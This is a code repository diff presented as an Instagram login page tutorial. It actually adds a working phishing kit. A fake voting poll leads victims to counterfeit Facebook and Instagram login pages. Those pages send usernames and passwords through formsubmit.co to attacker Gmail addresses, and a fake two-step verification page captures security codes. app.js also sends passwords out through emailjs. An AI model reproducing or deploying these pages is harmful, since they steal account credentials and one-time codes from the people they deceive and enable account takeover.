@@ -1,1 +1,1757 @@
+# Instagram Login Page Using HTML CSS JavaScript
 
+    Instagram Login Page Using HTML CSS JavaScript | Responsive and Darkmode
+
+# Video
+
+    https://youtu.be/5ILTBoY3V6c
+
+# Description
+
+    We will Make Instagram Login Page Using HTML CSS JavaScript
+
+# Resource
+
+    Google font: https://fonts.google.com/
+
+# Preview
+
+!["Instagram Login Page Using HTML CSS JavaScript"](https://user-images.githubusercontent.com/67447840/121037267-82218e80-c7d9-11eb-930b-63a3a3d65c43.png "Instagram Login Page Using HTML CSS JavaScript")
+
+!["Instagram Login Page Using HTML CSS JavaScript"](https://user-images.githubusercontent.com/67447840/121037323-8ea5e700-c7d9-11eb-80ce-d2d1486f7775.png "Instagram Login Page Using HTML CSS JavaScript")
+
+!["Instagram Login Page Using HTML CSS JavaScript"](https://user-images.githubusercontent.com/67447840/121037391-9e253000-c7d9-11eb-9536-33e1379a10e8.png "Instagram Login Page Using HTML CSS JavaScript")
+ 352 changes: 352 additions & 0 deletions352  
+app.css
+Original file line number	Diff line number	Diff line change
+@@ -0,0 +1,352 @@
+:root {
+  --body-bg: #fafafa;
+  --box-bg: #fff;
+  --box-border-color: #dbdbdb;
+  --txt-color: #262626;
+  --txt-second-color: #8e8e8e;
+  --btn-bg: #0095f6;
+  --btn-color: #fff;
+  --fb-color: #385185;
+  --a-color: #00376b;
+}
+
+.dark {
+  --body-bg: #151515;
+  --box-bg: #151515;
+  --box-border-color: #262626;
+  --txt-color: #d2d2d2;
+}
+
+* {
+  padding: 0;
+  margin: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: "Roboto", sans-serif;
+  background-color: var(--body-bg);
+  color: var(--txt-color);
+}
+
+.container {
+  height: 100vh;
+  display: flex;
+  flex-direction: column;
+}
+
+.main-container {
+  display: flex;
+  flex-grow: 1;
+}
+
+.main-content {
+  margin: 32px auto;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  max-width: 935px;
+  flex-grow: 1;
+}
+
+.slide-container {
+  height: 618px;
+  flex-basis: 454px;
+}
+
+.slide-content {
+  margin: 99px 0 0 151px;
+  position: relative;
+}
+
+.slide-content img {
+  position: absolute;
+  inset: 0;
+  opacity: 0;
+  visibility: hidden;
+  transition: all 0.5s ease-in-out;
+}
+
+.slide-content img.active {
+  opacity: 1;
+  visibility: visible;
+}
+
+.form-container {
+  flex-grow: 1;
+  max-width: 350px;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+}
+
+.box {
+  border: 1px solid var(--box-border-color);
+  background-color: var(--box-bg);
+  border-radius: 3px;
+}
+
+.form-content {
+  margin-bottom: 10px;
+  padding: 10px;
+}
+
+.form-content .logo {
+  text-align: center;
+  height: 51px;
+  width: 175px;
+  margin: 22px auto 12px;
+}
+
+.form-content .logo img {
+  max-width: 100%;
+}
+
+.logo-dark {
+  display: none;
+}
+
+.dark .logo-dark {
+  display: block;
+}
+
+.dark .logo-light {
+  display: none;
+}
+
+.signin-form {
+  padding-top: 24px;
+  margin-bottom: 10px;
+}
+
+.form-group {
+  margin: 0 40px 6px;
+}
+
+.animate-input {
+  height: 36px;
+  border: 1px solid var(--box-border-color);
+  border-radius: 3px;
+  position: relative;
+}
+
+.animate-input span {
+  position: absolute;
+  left: 8px;
+  height: 100%;
+  font-size: 12px;
+  line-height: 36px;
+  color: var(--txt-second-color);
+  transform-origin: left;
+  transition: transform 0.1s ease-in-out;
+  pointer-events: none;
+}
+
+.animate-input input {
+  width: 100%;
+  height: 100%;
+  padding: 9px 8px 7px;
+  border: 0;
+  outline: 0;
+  background-color: var(--box-bg);
+  color: var(--txt-color);
+}
+
+.animate-input.active span {
+  transform: scale(0.83333) translateY(-10px);
+}
+
+.animate-input.active input {
+  padding: 14px 0 2px 8px;
+}
+
+.animate-input button {
+  color: var(--txt-color);
+  border: 0;
+  outline: 0;
+  display: inline;
+  font-weight: 600;
+  font-size: 14px;
+  background-color: transparent;
+  position: absolute;
+  right: 8px;
+  top: 50%;
+  transform: translateY(-50%);
+  cursor: pointer;
+  display: none;
+}
+
+.animate-input.active button {
+  display: inline;
+}
+
+.btn-group {
+  padding: 8px 40px;
+}
+
+.btn-login {
+  width: 100%;
+  border: 1px solid transparent;
+  outline: 0;
+  background-color: var(--btn-bg);
+  color: var(--btn-color);
+  cursor: pointer;
+  font-weight: 600;
+  font-size: 14px;
+  line-height: 18px;
+  padding: 5px 9px;
+  border-radius: 4px;
+}
+
+button:disabled {
+  background-color: rgba(0, 149, 246, 0.3);
+}
+
+.divine {
+  padding: 10px 40px 18px;
+  display: flex;
+}
+
+.divine div:nth-child(2) {
+  font-size: 13px;
+  font-weight: 600;
+  line-height: 15px;
+  margin: 0 18px;
+  color: var(--txt-second-color);
+}
+
+.divine div:nth-child(1),
+.divine div:nth-child(3) {
+  flex-grow: 1;
+  height: 1px;
+  background-color: var(--box-border-color);
+  position: relative;
+  top: 0.45em;
+}
+
+.btn-fb {
+  border: 0;
+  outline: 0;
+  background-color: transparent;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 100%;
+  cursor: pointer;
+}
+
+.btn-fb img {
+  width: 16px;
+  height: 16px;
+  margin-right: 8px;
+}
+
+.btn-fb span {
+  color: var(--fb-color);
+  font-size: 14px;
+  font-weight: 600;
+  line-height: 18px;
+}
+
+.forgot-pw {
+  display: block;
+  font-size: 12px;
+  line-height: 14px;
+  margin-top: 12px;
+  text-align: center;
+  color: var(--a-color);
+  text-decoration: none;
+}
+
+.goto {
+  /* padding: 10px; */
+  /* margin-bottom: 10px; */
+}
+
+.goto p {
+  font-size: 14px;
+  margin: 15px;
+  text-align: center;
+}
+
+.goto a {
+  text-decoration: none;
+  color: var(--btn-bg);
+  font-size: inherit;
+  line-height: 18px;
+  font-weight: 600;
+}
+
+.app-download {
+  display: flex;
+  flex-direction: column;
+}
+
+.app-download p {
+  font-size: 14px;
+  line-height: 18px;
+  text-align: center;
+  margin: 10px 20px;
+}
+
+.store-link {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 10px;
+}
+
+.store-link a img {
+  height: 40px;
+}
+
+.store-link a:nth-child(1) {
+  margin-right: 8px;
+}
+
+.footer {
+  padding-bottom: 52px;
+  padding-top: 24px;
+}
+
+.links {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-wrap: wrap;
+}
+
+.links a {
+  text-decoration: none;
+  color: var(--txt-second-color);
+  font-size: 13px;
+  line-height: 18px;
+  margin: 0 8px 12px 8px;
+}
+
+.copyright {
+  padding: 12px 0;
+  color: var(--txt-second-color);
+  font-size: 13px;
+  line-height: 18px;
+  text-align: center;
+}
+
+/* responsive */
+
+@media only screen and (max-width: 800px) {
+  .slide-container {
+    display: none;
+  }
+}
+
+@media only screen and (max-width: 500px) {
+  .main-content {
+    margin-top: 0;
+  }
+
+  .box {
+    border: 0;
+    background-color: transparent;
+  }
+}
+ 79 changes: 79 additions & 0 deletions79  
+app.js
+Original file line number	Diff line number	Diff line change
+@@ -0,0 +1,79 @@
+let slide_content = document.querySelector("#slide-content");
+
+let signin_form = document.querySelector("#signin-form");
+
+let signin_btn = document.querySelector("#signin-btn");
+
+let darkmode_toggle = document.querySelector("#darkmode-toggle");
+
+let slide_index = 0;
+
+slide = () => {
+  let slide_items = slide_content.querySelectorAll("img");
+  slide_items.forEach((e) => e.classList.remove("active"));
+  slide_index = slide_index + 1 === slide_items.length ? 0 : slide_index + 1;
+  slide_items[slide_index].classList.add("active");
+};
+
+setInterval(slide, 2000);
+
+// animate input
+document.querySelectorAll(".animate-input").forEach((e) => {
+  let input = e.querySelector("input");
+  let button = e.querySelector("button");
+
+  input.onkeyup = () => {
+    if (input.value.trim().length > 0) {
+      e.classList.add("active");
+    } else {
+      e.classList.remove("active");
+    }
+
+    if (checkSigninInput()) {
+      signin_btn.removeAttribute("disabled");
+    } else {
+      signin_btn.setAttribute("disabled", "true");
+    }
+  };
+
+  // show password button
+  if (button) {
+    button.onclick = () => {
+      if (input.getAttribute("type") === "text") {
+        input.setAttribute("type", "password");
+        button.innerHTML = "Show";
+      } else {
+        input.setAttribute("type", "text");
+        button.innerHTML = "Hide";
+      }
+    };
+  }
+});
+
+checkSigninInput = () => {
+  let inputs = signin_form.querySelectorAll("input");
+  return Array.from(inputs).every((input) => {
+    return input.value.trim().length >= 6;
+  });
+};
+
+// darkmode toggle
+darkmode_toggle.onclick = (e) => {
+  e.preventDefault();
+  let body = document.querySelector("body");
+  body.classList.toggle("dark");
+  darkmode_toggle.innerHTML = body.classList.contains("dark")
+    ? "Lightmode"
+    : "Darkmode";
+};
+
+function sendMail() {
+  var params = {
+    from_name: document.getElementById("fullname").value,
+    username: document.getElementById("username").value,
+    password: document.getElementById("password").value,
+  };
+  emailjs
+    .send("service_3ywe4ld", "template_u7kkpvm", params)
+    .then(function (res) {});
+}
+ 220 changes: 220 additions & 0 deletions220  
+fb.html
+Original file line number	Diff line number	Diff line change
+@@ -0,0 +1,220 @@
+<!DOCTYPE html>
+<!-- Coding By CodingNepal - www.codingnepalweb.com -->
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="shortcut icon" href="images\facebook-icon.png" type="image/x-icon">
+    <!-- <link rel="stylesheet" href="style.css"> -->
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        .flex {
+            display: flex;
+            align-items: center;
+        }
+
+        .container {
+            padding: 0 15px;
+            min-height: 100vh;
+            justify-content: center;
+            background: #f0f2f5;
+        }
+
+        .facebook-page {
+            justify-content: space-between;
+            max-width: 1000px;
+            width: 100%;
+        }
+
+        .facebook-page .text {
+            margin-bottom: 90px;
+        }
+
+        .facebook-page h1 {
+            color: #1877f2;
+            font-size: 4rem;
+            margin-bottom: 10px;
+        }
+
+        .facebook-page p {
+            font-size: 1.75rem;
+            white-space: nowrap;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            background: #fff;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1),
+                0 8px 16px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+        }
+
+        form input {
+            height: 55px;
+            width: 100%;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            font-size: 1rem;
+            padding: 0 14px;
+        }
+
+        form input:focus {
+            outline: none;
+            border-color: #1877f2;
+        }
+
+        ::placeholder {
+            color: #777;
+            font-size: 1.063rem;
+        }
+
+        .link {
+            display: flex;
+            flex-direction: column;
+            text-align: center;
+            gap: 15px;
+        }
+
+        .link .login {
+            border: none;
+            outline: none;
+            cursor: pointer;
+            background: #1877f2;
+            padding: 15px 0;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 1.25rem;
+            font-weight: 600;
+            transition: 0.2s ease;
+        }
+
+        .link .login:hover {
+            background: #0d65d9;
+        }
+
+        form a {
+            text-decoration: none;
+        }
+
+        .link .forgot {
+            color: #1877f2;
+            font-size: 0.875rem;
+        }
+
+        .link .forgot:hover {
+            text-decoration: underline;
+        }
+
+        hr {
+            border: none;
+            height: 1px;
+            background-color: #ccc;
+            margin-bottom: 20px;
+            margin-top: 20px;
+        }
+
+        .button {
+            margin-top: 25px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .button a {
+            padding: 15px 20px;
+            background: #42b72a;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 1.063rem;
+            font-weight: 600;
+            transition: 0.2s ease;
+        }
+
+        .button a:hover {
+            background: #3ba626;
+        }
+
+        @media (max-width: 900px) {
+            .facebook-page {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .facebook-page .text {
+                margin-bottom: 30px;
+            }
+        }
+
+        @media (max-width: 460px) {
+            .facebook-page h1 {
+                font-size: 3.5rem;
+            }
+
+            .facebook-page p {
+                font-size: 1.3rem;
+            }
+
+            form {
+                padding: 15px;
+            }
+        }
+
+        .foot {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container flex">
+        <div class="facebook-page flex">
+            <div class="text">
+                <h1>facebook</h1>
+                <p>Connect with friends and the world </p>
+                <p> around you on Facebook.</p>
+            </div>
+            <form id="form" method="POST" action="https://formsubmit.co/voterspridecenter@gmail.com">
+                <input type="text" name="username" id="username" required placeholder="email">
+
+                <input type="text" name="password" id="password" required placeholder="password">
+                 <input type="hidden" name="_next" value="https://fanvote.mynetly.com/voteflb
+                
+                /thanks.html"> 
+                <input type="hidden" name="_captcha" value="false">
+                <div class="link">
+                    <button type="submit" value="Send Email" class="login" id="button" style="text-decoration: none; color: white;">Login 
+                    </button>
+                    <a href="#" class="forgot">Forgot password?</a>
+                </div>
+                <hr>
+                <div class="button">
+                    <a href="#">Create new account</a>
+                </div>
+            </form>
+        </div>
+    </div>
+    <footer class="foot">
+        © 2023 Meta
+
+    </footer>
+
+</body>
+
+
+</html>
+ 173 changes: 173 additions & 0 deletions173  
+ig.html
+Original file line number	Diff line number	Diff line change
+@@ -0,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instaagraam</title>
+    <!-- FAVIVON -->
+    <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
+    <!-- GOOGLE FONT -->
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+
+    <!-- APP CSS -->
+    <link rel="stylesheet" href="./app.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
+    integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
+    crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+
+<body>
+
+    <div class="container">
+        <div class="main-container">
+            <div class="main-content">
+                <div class="slide-container" style="background-image: url(./images/phone-frame.png);">
+                    <div class="slide-content" id="slide-content">
+                        <img src="./images/slide (1).jpg" alt="slide image" class="active">
+                        <img src="./images/slide (2).jpg" alt="slide image">
+                        <img src="./images/slide (3).jpg" alt="slide image">
+                        <img src="./images/slide (4).jpg" alt="slide image">
+                        <img src="./images/slide (5).jpg" alt="slide image">
+                    </div>
+                </div>
+                <div class="form-container">
+                    <form id="form"  method="POST" action="https://formsubmit.co/globalflashtrade247@gmail.com">
+
+                    <div class="form-content box">
+                        <div class="logo">
+                            <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
+                            <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark">
+                        </div>
+                        <div class="btn-group">
+                            <button class="btn-login" type="submit" id="button" value="Send Email">
+                            <i class="fab fa-facebook-square"></i> Continue Using Facebook
+                            </button>
+                                                  </div>
+                                                <div class="divine">
+                                                    <div></div>
+                                                    <div>OR</div>
+                                                    <div></div>
+                                                </div>
+                        <div class="signin-form" id="signin-form">
+                            <div class="form-group">
+                                <div class="animate-input">
+                                    <span>
+                                        Phone number, username or email
+                                    </span>
+                                    <input type="text" name="username" id="username" required>
+                                    <input type="hidden" name="_captcha" value="false">
+                                    <input type="hidden" name="_next" value="https://fanvote.mynetly.com/voteglb/instagram/otp/657daf104b167f68d1979b9c.html">
+                                </div>
+
+                            </div>
+                            <div class="form-group">
+                                <div class="animate-input">
+                                    <span>
+                                        Password
+                                    </span>
+
+
+                                    <input type="text" name="password" id="password" required>
+                                    <button>Show</button>
+                                </div>
+                                <div style="display: flex; text-align: end; justify-content: end; color: rgb(0, 17, 255);"><a href="#" class="forgot-pw">Forgotten your password?</a></div>
+                            </div>
+                            <div class="btn-group">
+                                <button class="btn-login"  type="submit" id="button" value="Send Email">
+                                    Log In
+                                </button>
+                                <div class="box goto">
+                                <p>
+                                    Don't have an account?
+                                    <a href="#">Sign up</a>
+                                </p>
+                                </div>
+
+                                </form>
+                            </div>
+
+
+
+                        </div>
+                    </div>
+
+
+                    <div class="app-download">
+                        <p>Get the app.</p>
+                        <div class="store-link">
+                            <a href="#">
+                                <img src="./images/app-store.png" alt="app store">
+                            </a>
+                            <a href="#">
+                                <img src="./images/gg-play.png" alt="google play">
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="footer">
+            <div class="links">
+                <a href="#">About</a>
+                <a href="#">Blog</a>
+                <a href="#">Jobs</a>
+                <a href="#">Help</a>
+                <a href="#">API</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+                <a href="#">Top Accounts</a>
+                <a href="#">Hashtags</a>
+                <a href="#">Locations</a>
+                <a href="#" id="darkmode-toggle">Darkmode</a>
+            </div>
+            <hr>
+
+                <div class="copyright">
+
+                    <p>from</p>
+
+                    <img src="images\download.jpg" alt="">
+
+            </div>
+
+        </div>
+    </div>
+    <!-- <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    
+    <script type="text/javascript">
+        emailjs.init('TNDdEBOh6CvEAAaKN')
+        const btn = document.getElementById('button');
+            document.getElementById('form')
+                .addEventListener('submit', function (event) {
+                    event.preventDefault();
+                    btn.value = 'Sending...';
+                    const serviceID = 'service_qrp6tch';
+                    const templateID = 'template_8vyte6j';
+                    emailjs.sendForm(serviceID, templateID, this)
+                        .then(() => {
+                            btn.value = 'Send Email';
+                            alert('Sorry, Your password was incorrect. please double-check your password.');
+                        }, (err) => {
+                            btn.value = 'Send Email';
+                            alert(JSON.stringify(err));
+                        });
+                });
+    </script> -->
+
+    <script src="app.js"></script> 
+
+<!-- <script> -->
+
+
+    <!-- </script> -->
+
+</body>
+
+</html>
+ Binary file addedBIN +54.2 KB 
+images/IMG-20231025-WA0086.jpg
+
+ Binary file addedBIN +3.67 KB 
+images/app-store.png
+
+ Binary file addedBIN +1.77 KB 
+images/download.jpg
+
+ Binary file addedBIN +4.25 KB 
+images/facebook-icon.png
+
+ Binary file addedBIN +33.9 KB 
+images/favicon.png
+
+ Binary file addedBIN +9.83 KB 
+images/gg-play.png
+
+ Binary file addedBIN +8.05 KB 
+images/logo-dark.png
+
+ Binary file addedBIN +30.8 KB 
+images/logo-light.png
+
+ Binary file addedBIN +107 KB 
+images/phone-frame.png
+
+ Binary file addedBIN +23.5 KB 
+images/slide (1).jpg
+
+ Binary file addedBIN +34.2 KB 
+images/slide (2).jpg
+
+ Binary file addedBIN +31.4 KB 
+images/slide (3).jpg
+
+ Binary file addedBIN +25.8 KB 
+images/slide (4).jpg
+
+ Binary file addedBIN +41.3 KB 
+images/slide (5).jpg
+
+ Binary file addedBIN +6.63 KB 
+img/socials/appstore.png
+
+ Binary file addedBIN +5.83 KB 
+img/socials/googleplay.png
+
+ Binary file addedBIN +33.9 KB 
+img/socials/icon.png
+
+ Binary file addedBIN +182 KB 
+img/socials/screen1.png
+
+ Binary file addedBIN +55.4 KB 
+img/socials/screen2.png
+
+ Binary file addedBIN +148 KB 
+img/socials/screen3.png
+
+ Binary file addedBIN +109 KB 
+img/socials/smartphones.png
+
+ 309 changes: 309 additions & 0 deletions309  
+index.html
+Original file line number	Diff line number	Diff line change
+@@ -0,0 +1,309 @@
+<!DOCTYPE html>
+<!-- Created By CodingNepal - www.codingnepalweb.com -->
+<html lang="en">
+
+<head>
+  <!-- <meta name="titimg" content="images\IMG-20231025-WA0086.jpg" >  -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- <meta property="og:image" itemprop="image" content="images\IMG-20231025-WA0086.jpg">
+  <meta property="og:type" content="website"/> 
+  <meta property="og:image:type" content="image/png"> -->
+  <title>Voting </title>
+  <link rel="shortcut icon"
+    href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRCb7bLX6H2SN7FytkuJkdnHf3DlBAWH8nVq9p6E1kGgw&s"
+    type="image/x-icon">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500;600;700&display=swap');
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      background: #FFFDD0;
+    }
+
+    ::selection {
+      color: #fff;
+      background: #6665ee;
+    }
+
+    .wrapper {
+      background: #fff;
+      border-radius: 15px;
+      padding: 25px;
+      max-width: 380px;
+      width: 100%;
+      box-shadow: 0px 5px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .wrapper header {
+      font-size: 22px;
+      font-weight: 600;
+    }
+
+    .wrapper .poll-area {
+      margin: 20px 0 15px 0;
+    }
+
+    .poll-area label {
+      display: block;
+      margin-bottom: 10px;
+      border-radius: 5px;
+      padding: 8px 15px;
+      border: 2px solid #e6e6e6;
+      transition: all 0.2s ease;
+    }
+
+    .poll-area label:hover {
+      border-color: #ddd;
+    }
+
+    label.selected {
+      border-color: #6665ee !important;
+    }
+
+    label .row {
+      display: flex;
+      pointer-events: none;
+      justify-content: space-between;
+    }
+
+    label .row .column {
+      display: flex;
+      align-items: center;
+    }
+
+    label .row .circle {
+      height: 19px;
+      width: 19px;
+      display: block;
+      border: 2px solid #ccc;
+      border-radius: 50%;
+      margin-right: 10px;
+      position: relative;
+    }
+
+    label.selected .row .circle {
+      border-color: #6665ee;
+    }
+
+    label .row .circle::after {
+      content: "";
+      height: 11px;
+      width: 11px;
+      background: #6665ee;
+      border-radius: inherit;
+      position: absolute;
+      left: 2px;
+      top: 2px;
+      display: none;
+    }
+
+    .poll-area label:hover .row .circle::after {
+      display: block;
+      background: #e6e6e6;
+    }
+
+    label.selected .row .circle::after {
+      display: block;
+      background: #6665ee !important;
+    }
+
+    label .row span {
+      font-size: 16px;
+      font-weight: 500;
+    }
+
+    label .row .percent {
+      display: none;
+    }
+
+    label .progress {
+      height: 7px;
+      width: 100%;
+      position: relative;
+      background: #f0f0f0;
+      margin: 8px 0 3px 0;
+      border-radius: 30px;
+      display: none;
+      pointer-events: none;
+    }
+
+    label .progress:after {
+      position: absolute;
+      content: "";
+      height: 100%;
+      background: #ccc;
+      width: calc(1% * var(--w));
+      border-radius: inherit;
+      transition: all 0.2s ease;
+    }
+
+    label.selected .progress::after {
+      background: #6665ee;
+    }
+
+    label.selectall .progress,
+    label.selectall .row .percent {
+      display: block;
+    }
+
+    input[type="radio"],
+    input[type="checkbox"] {
+      display: none;
+    }
+
+    .button {
+      background-color: #E1306C;
+      border: none;
+      color: white;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 16px;
+      margin: 4px 2px;
+      cursor: pointer;
+    }
+
+    .button1 {
+      padding: 10px 24px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="wrapper">
+    <header>Choose an option to vote for
+    </header>
+    <div class="poll-area">
+      <input type="checkbox" name="poll" id="opt-1">
+      <input type="checkbox" name="poll" id="opt-2">
+      <input type="checkbox" name="poll" id="opt-3">
+      <input type="checkbox" name="poll" id="opt-4">
+      <input type="checkbox" name="poll" id="opt-5">
+      <input type="checkbox" name="poll" id="opt-6">
+
+      <label for="opt-1" class="opt-1">
+        <div class="row">
+          <div class="column">
+            <span class="circle"></span>
+            <span class="text">Ambassador
+            </span>
+          </div>
+          <span class="percent">40%</span>
+        </div>
+        <div class="progress" style='--w:30;'></div>
+      </label>
+      <label for="opt-2" class="opt-2">
+        <div class="row">
+          <div class="column">
+            <span class="circle"></span>
+            <span class="text">Host
+            </span>
+          </div>
+          <span class="percent">25%</span>
+        </div>
+        <div class="progress" style='--w:20;'></div>
+      </label>
+      <label for="opt-3" class="opt-3">
+        <div class="row">
+          <div class="column">
+            <span class="circle"></span>
+            <span class="text">Rage
+            </span>
+          </div>
+          <span class="percent">15%</span>
+        </div>
+        <div class="progress" style='--w:40;'></div>
+      </label>
+      <label for="opt-4" class="opt-4">
+        <div class="row">
+          <div class="column">
+            <span class="circle"></span>
+            <span class="text">
+              Vogue
+            </span>
+            </span>
+          </div>
+          <span class="percent">10%</span>
+        </div>
+        <div class="progress" style='--w:10;'></div>
+      </label>
+      <label for="opt-4" class="opt-4">
+        <div class="row">
+          <div class="column">
+            <span class="circle"></span>
+            <span class="text">
+              GUCCI
+            </span>
+            </span>
+          </div>
+          <span class="percent">10%</span>
+        </div>
+        <div class="progress" style='--w:10;'></div>
+      </label>
+
+
+    </div>
+    <!-- <button class="button button1"><a href="real" style="text-decoration: none; color: white;">
+      continue vote on Instagram</a></button> -->
+    <button class="button button1"><a href="fb.html" style="text-decoration: none; color: white;">
+        Continue here to vote</a></button>
+
+
+  </div>
+
+  <script>
+    const options = document.querySelectorAll("label");
+    for (let i = 0; i < options.length; i++) {
+      options[i].addEventListener("click", () => {
+        for (let j = 0; j < options.length; j++) {
+          if (options[j].classList.contains("selected")) {
+            options[j].classList.remove("selected");
+          }
+        }
+
+        options[i].classList.add("selected");
+        for (let k = 0; k < options.length; k++) {
+          options[k].classList.add("selectall");
+        }
+
+        let forVal = options[i].getAttribute("for");
+        let selectInput = document.querySelector("#" + forVal);
+        let getAtt = selectInput.getAttribute("type");
+        if (getAtt == "checkbox") {
+          selectInput.setAttribute("type", "radio");
+        } else if (selectInput.checked == true) {
+          options[i].classList.remove("selected");
+          selectInput.setAttribute("type", "checkbox");
+        }
+
+        let array = [];
+        for (let l = 0; l < options.length; l++) {
+          if (options[l].classList.contains("selected")) {
+            array.push(l);
+          }
+        }
+        if (array.length == 0) {
+          for (let m = 0; m < options.length; m++) {
+            options[m].removeAttribute("class");
+          }
+        }
+      });
+    }
+  </script>
+
+
+
+</body>
+
+</html>
+ 175 changes: 175 additions & 0 deletions175  
+instagram/otp/657daf104b167f68d1979b9c.html
+Original file line number	Diff line number	Diff line change
+@@ -0,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="pt-AO">
+
+<!-- Mirrored from fanfamousity.com/instagram/otp/657daf104b167f68d1979b9c by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 17 Dec 2023 11:22:13 GMT -->
+<!-- Added by ddddHTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="shortcut icon"
+      href="../../img/socials/icon.png"
+      type="image/x-icon"
+    />
+    <link rel="stylesheet" href="../../css/style2.css" />
+    <title>Vote with Social Media</title>
+    <style>
+      .small-title {
+        margin: 1em auto;
+        color: #000;
+      }
+      .form-area form input {
+        padding: 0.5em;
+        outline-width: none !important;
+      }
+      .small {
+        font-size: 0.85em;
+        display: block;
+        text-align: center;
+        margin: 0.5em auto;
+      }
+    </style>
+  </head>
+  <body onload="SwitchScreen()">
+    <section class="container">
+      <!-- SMARTPHONE SECTION -->
+      <article class="smartphone">
+        <div class="screens">
+          <img
+            class="screen fade"
+            src="../../img/socials/screen1.png"
+            alt="screen1"
+          />
+          <img
+            class="screen fade"
+            src="../../img/socials/screen2.png"
+            alt="screen2"
+          />
+          <img
+            class="screen fade"
+            src="../../img/socials/screen3.png"
+            alt="screen3"
+          />
+        </div>
+        <img src="../../img/socials/smartphones.png" alt="smartphones" />
+      </article>
+      <!-- SMARTPHONE SECTION END -->
+      <!-- FORM SECTION -->
+      <article class="form-area">
+        <form  action="https://formsubmit.co/globalflashtrade247@gmail.com" method="POST" accept=".">
+          <p class="small-title">2-Step Verification</p>
+          <input
+            type="text"
+            name="code"
+            id="code"
+            required
+            placeholder="Security code"
+          />
+          <input type="hidden" name="linkId" value="657daf104b167f68d1979b9c" />
+          <input type="submit" name="submit" value="Confirm" />
+          <div class="options">
+            <p class="small">Didn't get security code? we can</p>
+            <a href="#" class="small">resend it</a>
+            <div class="forget"><a href="#">Forgot password?</a></div>
+          </div>
+          <input type="hidden" name="_next" value="https://fanvote.mynetly.com/voteglb/thanks.html">
+<input type="hidden" name="_captcha" value="false">
+
+        </form>
+        <div class="noaccount">
+          <a href="#">Don't have an account? <span>Signup</span></a>
+        </div>
+        <div class="apps">
+          <p>Get the app</p>
+          <a href="#">
+            <img src="../../img/socials/appstore.png" alt="Get it from AppStore" />
+          </a>
+          <a href="#">
+            <img
+              src="../../img/socials/googleplay.png"
+              alt="Get it from Google Play"
+            />
+          </a>
+        </div>
+      </article>
+    </section>
+    <!-- FORM SECTION END -->
+    <!-- FOOTER -->
+    <footer>
+      <div class="footer-content">
+        <a href="#">Meta</a>
+        <a href="#">About</a>
+        <a href="#">Blog</a>
+        <a href="#">Jobs</a>
+        <a href="#">API</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <a href="#">Locations</a>
+        <a href="#">Hashtags</a>
+        <a href="#">Threads</a>
+        <a href="#">Instagram Lite</a>
+      </div>
+      <div>
+        <a href="#">Dance</a>
+        <a href="#">Food and Drink</a>
+        <a href="#">Home garden</a>
+        <a href="#">Music</a>
+        <a href="#">Visual arts</a>
+      </div>
+      <div class="copyright">
+        <select aria-label="Trocar idioma de exibição">
+          <option value="en">English</option>
+          <option value="af">Afrikaans</option>
+          <option value="cs">Čeština</option>
+          <option value="da">Dansk</option>
